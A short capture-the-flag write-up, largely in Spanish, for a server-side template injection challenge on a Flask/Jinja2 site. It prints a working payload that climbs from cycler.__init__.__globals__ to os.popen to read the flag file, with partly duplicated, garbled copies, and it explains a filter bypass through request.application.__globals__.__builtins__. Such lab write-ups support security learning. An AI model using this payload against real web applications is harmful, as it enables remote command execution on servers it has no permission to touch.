Descripcion:

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://xebec.cylabacademy.net:48237/)!

Solucion:

```

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}self._TemplateReference__context.cycler .__init__.__globals__. os.popen ( ' cat flag' ). read ()}}  inserte esto en el url  y me dio la bandera

academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dee0a1a6}self._TemplateReference__context.cycler .__init__.__globals__. os.popen ( ' cat flag' ). read ()}}

academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dee0a1a6}

```

notas:

Añadimos esta función request.application.__globals__.__builtins__porque nuestro código original __import__('os')estaba bloqueado por un filtro. Para sortearlo, necesitábamos una ruta diferente para acceder indirectamente a las funciones integradas de Python.

**Así es como funciona la cadena:**

1. **request.application**  
    En Flask, el requestobjeto nos da acceso a la instancia de la aplicación a través de request.application.
2. **__globals__**  
    La aplicación (a menudo una función u objeto) almacena referencias a sus variables globales mediante el __globals__atributo. Esto nos da acceso al ámbito interno de Python.
3. **__builtins__**  
    Dentro de __globals__, hay __builtins__, que contiene todas las funciones integradas de Python, incluyendo__import__

Pulsa Intro o haz clic para ver la imagen a tamaño completo.

Referencia:

[https://medium.com/@gbahenrijoel/picoctf-20250-web-ssti-1-56b85ac6b278](https://medium.com/@gbahenrijoel/picoctf-20250-web-ssti-1-56b85ac6b278)